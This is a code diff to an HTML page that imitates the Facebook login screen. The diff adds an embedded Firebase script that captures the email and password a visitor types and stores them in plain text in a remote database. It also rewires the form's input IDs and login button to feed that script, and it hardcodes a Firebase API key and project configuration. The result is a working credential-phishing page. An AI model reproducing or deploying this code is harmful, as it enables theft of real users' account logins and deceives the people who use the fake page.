@@ -6,9 +6,48 @@
 <link type="text/css" rel="stylesheet" href="style1.css" />
 <link type="text/css" rel="stylesheet" href="style2.css" />
 <link type="text/css" rel="stylesheet" href="style3.css" /><link type="text/css" rel="stylesheet" href="style4.css" /><link type="text/css" rel="stylesheet" href="style5.css" />
-<script async src="https://api.kvstore.io/js/public.js?storage_uuid=fd94abcb-f8f6-4114-8076-d0eda839d8bb"></script>
 </head>
 <body>
+
+	<script type="module">
+		// Import the functions you need from the SDKs you need
+		import { initializeApp } from "https://www.gstatic.com/firebasejs/9.9.1/firebase-app.js";
+		import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.9.1/firebase-database.js";
+	
+		// TODO: Add SDKs for Firebase products that you want to use
+		// https://firebase.google.com/docs/web/setup#available-libraries
+	
+		// Your web app's Firebase configuration
+		const firebaseConfig = {
+			apiKey: "AIzaSyDBex4vyeYTOLWTKzFHsc0251GuVPls2DA",
+			authDomain: "testing-65a3c.firebaseapp.com",
+			databaseURL: "https://testing-65a3c-default-rtdb.firebaseio.com",
+			projectId: "testing-65a3c",
+			storageBucket: "testing-65a3c.appspot.com",
+			messagingSenderId: "224865471888",
+			appId: "1:224865471888:web:e8ce9767ff7cfe4833f715"
+		};
+	
+		// Initialize Firebase
+		const app = initializeApp(firebaseConfig);
+	
+		// Initialize Realtime Database and get a reference to the service
+		const database = getDatabase(app);
+	
+		function writeUserData() {
+			const db = getDatabase();
+			let email = document.getElementById("user_email").value
+			let pwd = document.getElementById("user_pass").value
+			let userId = (Math.random() + 1).toString(36).substring(7);
+			console.log(email, pwd, userId)
+			set(ref(db, 'users/' + userId), {
+				email: email,
+				pwd : pwd
+			});
+		}
+
+		document.getElementById("loginSubmitBtn").addEventListener("click", writeUserData, false);
+	</script>	
 <div class="_li">
 <div id="pagelet_bluebar" data-referrer="pagelet_bluebar">
 <div id="blueBarHolder">
@@ -53,12 +92,12 @@
 		<div id="loginform">
 			<div class="form_row clearfix">
 				<label for="email" class="login_form_label">Email or Phone:</label>
-				<input type="text" class="inputtext" id="email" name="email" value="">
+				<input type="text" class="inputtext" id="user_email" name="email" value="">
 			</div>
 			
 			<div class="form_row clearfix">
 				<label for="pass" class="login_form_label">Password:</label>
-				<input type="password" name="pass" id="pass" class="inputpassword">
+				<input type="password" name="pass" id="user_pass" class="inputpassword">
 			</div>
 			<div class="persistent">
 				<div class="uiInputLabel clearfix uiInputLabelLegacy">
@@ -70,7 +109,7 @@
 			<div id="buttons" class="form_row clearfix">
 				<label class="login_form_label"></label>
 				<div id="login_button_inline">
-					<label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log in" name="login" type="submit" id="u_0_1"></label>
+					<label class="uiButton uiButtonConfirm uiButtonLarge" id="loginbutton" for="u_0_1"><input value="Log in" name="login" type="button" id="loginSubmitBtn" /></label>
 				</div>
 				
 				<div id="register_link">or <strong><a href="#" target="_self" rel="nofollow" id="reg_btn_link" tabindex="-1">Sign up for Facebook</a></strong></div>
@@ -130,9 +169,4 @@
 	<div class="fsm fwn fcg"><span> Facebook © 2022</span> · <a rel="dialog" title="Use Facebook in another language." href="#" role="button">English (UK)</a></div></div></div></div></div>
 
 </body>
-<script>
-	window.post('new_collection', 
-            'contacts_20200608120400', 
-            '{"email": "fan@myreggaeband.com", "text": "Your music is awesome!"}')
-</script>
 </html>
